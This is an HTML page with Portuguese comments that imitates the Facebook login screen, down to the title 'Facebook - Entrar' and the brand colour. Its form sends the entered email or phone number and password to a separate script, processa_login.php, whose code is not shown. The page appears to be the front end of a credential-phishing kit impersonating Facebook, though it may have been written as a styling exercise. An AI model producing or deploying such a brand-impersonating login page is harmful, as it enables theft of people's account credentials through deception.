<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Entrar</title>
    <style>
        /* Estilizando o corpo da página */
        body {
            font-family: Arial, sans-serif; /* Definindo a fonte */
            background-color: #f1f2f6; /* Cor de fundo da página */
            display: flex; /* Usando flexbox para centralizar */
            justify-content: center; /* Centralizando horizontalmente */
            align-items: center; /* Centralizando verticalmente */
            height: 100vh; /* Garantindo que a altura da página ocupe toda a tela */
            margin: 0; /* Removendo a margem padrão do corpo */
        }

        /* Estilizando o container do formulário */
        .login-container {
            width: 300px; /* Largura do container */
            background-color: #fff; /* Cor de fundo do container */
            padding: 30px; /* Espaçamento interno */
            border-radius: 5px; /* Bordas arredondadas */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Sombras para o efeito 3D */
        }

        /* Estilizando os campos de entrada de texto e senha */
        input[type="text"], input[type="password"] {
            width: 100%; /* Largura total do campo */
            padding: 10px; /* Espaçamento interno */
            margin: 10px 0; /* Espaçamento entre os campos */
            border: 1px solid #ccc; /* Borda do campo */
            border-radius: 5px; /* Bordas arredondadas */
        }

        /* Estilizando o botão de login */
        input[type="submit"] {
            width: 100%; /* Largura total do botão */
            padding: 10px; /* Espaçamento interno */
            background-color: #3b5998; /* Cor de fundo do botão (Facebook) */
            color: white; /* Cor do texto */
            border: none; /* Sem borda */
            border-radius: 5px; /* Bordas arredondadas */
            cursor: pointer; /* Cursor em forma de mãozinha */
        }

        /* Estilo para o botão ao passar o mouse por cima */
        input[type="submit"]:hover {
            background-color: #365899; /* Cor do botão ao passar o mouse */
        }
    </style>
</head>
<body>

    <!-- Container do formulário -->
    <div class="login-container">
        <h2>Facebook</h2> <!-- Título do formulário -->
        
        <!-- Formulário de login -->
        <form action="processa_login.php" method="POST">
            <!-- Campo para o e-mail ou telefone -->
            <input type="text" name="username" placeholder="E-mail ou telefone" required>
            
            <!-- Campo para a senha -->
            <input type="password" name="password" placeholder="Senha" required>
            
            <!-- Botão de envio do formulário -->
            <input type="submit" value="Entrar">
        </form>
    </div>

</body>
</html>
